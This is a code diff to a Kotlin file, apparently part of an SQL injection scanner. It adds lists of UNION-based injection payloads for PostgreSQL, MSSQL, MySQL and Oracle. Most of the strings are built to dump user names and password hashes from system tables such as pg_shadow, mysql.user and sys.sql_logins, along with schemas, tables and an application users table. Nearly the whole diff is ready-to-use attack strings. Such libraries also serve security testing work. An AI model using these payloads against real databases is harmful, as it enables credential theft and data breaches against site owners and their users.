@@ -64,6 +64,81 @@ object SQLPayloads {
         "' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'--"
     )
     
+    // PostgreSQL data extraction payloads
+    val POSTGRESQL_EXTRACTION_PAYLOADS = listOf(
+        "' UNION SELECT NULL,usename||':'||passwd,NULL FROM pg_shadow--",
+        "' UNION SELECT NULL,datname,NULL FROM pg_database--",
+        "' UNION SELECT NULL,tablename,NULL FROM pg_tables--",
+        "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--"
+    )
+    
+    // MSSQL data extraction payloads
+    val MSSQL_EXTRACTION_PAYLOADS = listOf(
+        "' UNION SELECT NULL,name,NULL FROM sys.databases--",
+        "' UNION SELECT NULL,name,NULL FROM sys.tables--",
+        "' UNION SELECT NULL,name+':'+password_hash,NULL FROM sys.sql_logins--"
+    )
+    
+    // Comprehensive database dump payloads for MySQL
+    val MYSQL_DUMP_PAYLOADS = listOf(
+        // Users and credentials
+        "' UNION SELECT NULL,CONCAT(user,':',password),NULL FROM mysql.user--",
+        "' UNION SELECT NULL,GROUP_CONCAT(user,':',password),NULL FROM mysql.user--",
+        // Database schemas
+        "' UNION SELECT NULL,GROUP_CONCAT(schema_name),NULL FROM information_schema.schemata--",
+        // All tables
+        "' UNION SELECT NULL,GROUP_CONCAT(table_schema,':',table_name),NULL FROM information_schema.tables--",
+        // User table details
+        "' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'--",
+        // Dump user data
+        "' UNION SELECT NULL,GROUP_CONCAT(id,':',username,':',email,':',password),NULL FROM users--",
+        // Version and metadata
+        "' UNION SELECT NULL,VERSION(),NULL--",
+        "' UNION SELECT NULL,@@hostname,NULL--",
+        "' UNION SELECT NULL,DATABASE(),NULL--"
+    )
+    
+    // Comprehensive database dump payloads for PostgreSQL
+    val POSTGRESQL_DUMP_PAYLOADS = listOf(
+        // Users and credentials
+        "' UNION SELECT NULL,usename||':'||passwd,NULL FROM pg_shadow--",
+        "' UNION SELECT NULL,STRING_AGG(usename||':'||passwd,','),NULL FROM pg_shadow--",
+        // Database schemas
+        "' UNION SELECT NULL,STRING_AGG(datname,','),NULL FROM pg_database--",
+        // All tables
+        "' UNION SELECT NULL,STRING_AGG(schemaname||':'||tablename,','),NULL FROM pg_tables--",
+        // User table details
+        "' UNION SELECT NULL,STRING_AGG(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'--",
+        // Version
+        "' UNION SELECT NULL,VERSION(),NULL--"
+    )
+    
+    // Comprehensive database dump payloads for MSSQL
+    val MSSQL_DUMP_PAYLOADS = listOf(
+        // Databases
+        "' UNION SELECT NULL,STRING_AGG(name,','),NULL FROM sys.databases--",
+        "' UNION SELECT NULL,name,NULL FROM sys.databases--",
+        // Tables
+        "' UNION SELECT NULL,STRING_AGG(name,','),NULL FROM sys.tables--",
+        // Users and logins
+        "' UNION SELECT NULL,name+':'+CONVERT(VARCHAR,password_hash),NULL FROM sys.sql_logins--",
+        "' UNION SELECT NULL,STRING_AGG(name,','),NULL FROM sys.server_principals--",
+        // Version
+        "' UNION SELECT NULL,@@VERSION,NULL--"
+    )
+    
+    // Comprehensive database dump payloads for Oracle
+    val ORACLE_DUMP_PAYLOADS = listOf(
+        // Users
+        "' UNION SELECT NULL,username,NULL FROM all_users--",
+        "' UNION SELECT NULL,LISTAGG(username,',') WITHIN GROUP (ORDER BY username),NULL FROM all_users--",
+        // Tables
+        "' UNION SELECT NULL,table_name,NULL FROM all_tables--",
+        "' UNION SELECT NULL,LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),NULL FROM all_tables--",
+        // Version
+        "' UNION SELECT NULL,BANNER,NULL FROM v\$version--"
+    )
+    
     // Get all payloads for comprehensive scanning
     fun getAllPayloads(): List<String> {
         return DETECTION_PAYLOADS + MYSQL_PAYLOADS + POSTGRESQL_PAYLOADS + 
